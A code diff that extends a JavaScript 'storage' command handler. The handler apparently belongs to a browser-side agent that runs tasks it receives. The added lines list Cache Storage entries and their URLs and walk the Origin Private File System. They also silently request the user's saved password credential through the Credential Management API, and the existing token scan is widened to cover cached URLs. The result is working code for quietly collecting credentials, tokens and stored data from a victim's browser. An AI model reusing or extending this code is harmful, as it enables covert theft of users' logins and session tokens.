@@ -61,6 +61,69 @@ COMMANDS['storage'] = async function(task) {
     } catch (e) {}
     result.indexedDB = {count: idbNames.length, databases: idbNames};
 
+    // --- Cache Storage API ---
+    var cacheEntries = [];
+    try {
+        if (typeof caches !== 'undefined' && caches.keys) {
+            var cacheNames = await caches.keys();
+            for (var cn = 0; cn < cacheNames.length; cn++) {
+                var cache = await caches.open(cacheNames[cn]);
+                var cacheKeys = await cache.keys();
+                var urls = [];
+                for (var cu = 0; cu < cacheKeys.length && cu < 50; cu++) {
+                    urls.push(cacheKeys[cu].url);
+                }
+                cacheEntries.push({
+                    name: cacheNames[cn],
+                    entries: cacheKeys.length,
+                    urls: urls
+                });
+            }
+        }
+    } catch (e) {}
+    result.cacheStorage = {count: cacheEntries.length, caches: cacheEntries};
+
+    // --- Origin Private File System (OPFS) ---
+    var opfsEntries = [];
+    try {
+        if (navigator.storage && navigator.storage.getDirectory) {
+            var opfsRoot = await navigator.storage.getDirectory();
+            // Enumerate top-level entries
+            var opfsIter = opfsRoot.entries ? opfsRoot.entries() : null;
+            if (opfsIter) {
+                for await (var entry of opfsIter) {
+                    var entryInfo = {name: entry[0], kind: entry[1].kind};
+                    if (entry[1].kind === 'file') {
+                        try {
+                            var file = await entry[1].getFile();
+                            entryInfo.size = file.size;
+                            entryInfo.lastModified = new Date(file.lastModified).toISOString();
+                        } catch (e) {}
+                    }
+                    opfsEntries.push(entryInfo);
+                }
+            }
+        }
+    } catch (e) {}
+    result.opfs = {count: opfsEntries.length, entries: opfsEntries};
+
+    // --- Saved Credentials (Credential Management API) ---
+    var savedCreds = [];
+    try {
+        if (navigator.credentials && navigator.credentials.get) {
+            var cred = await navigator.credentials.get({password: true, mediation: 'silent'});
+            if (cred) {
+                savedCreds.push({
+                    type: cred.type,
+                    id: cred.id || '',
+                    name: cred.name || '',
+                    iconURL: cred.iconURL || ''
+                });
+            }
+        }
+    } catch (e) {}
+    result.savedCredentials = {count: savedCreds.length, items: savedCreds};
+
     // --- Interesting token patterns ---
     var tokens = [];
     var tokenPatterns = [
@@ -95,6 +158,13 @@ COMMANDS['storage'] = async function(task) {
     // Scan sessionStorage
     for (var si = 0; si < ss.length; si++) {
         if (!ss[si].error) scanValue('sessionStorage', ss[si].key, ss[si].value);
+    }
+    // Scan cache URLs for tokens
+    for (var csi = 0; csi < cacheEntries.length; csi++) {
+        var ce = cacheEntries[csi];
+        for (var cui = 0; cui < ce.urls.length; cui++) {
+            scanValue('cacheStorage:' + ce.name, ce.urls[cui], ce.urls[cui]);
+        }
     }
     // Scan meta tags
     var metas = document.querySelectorAll('meta[name], meta[property]');
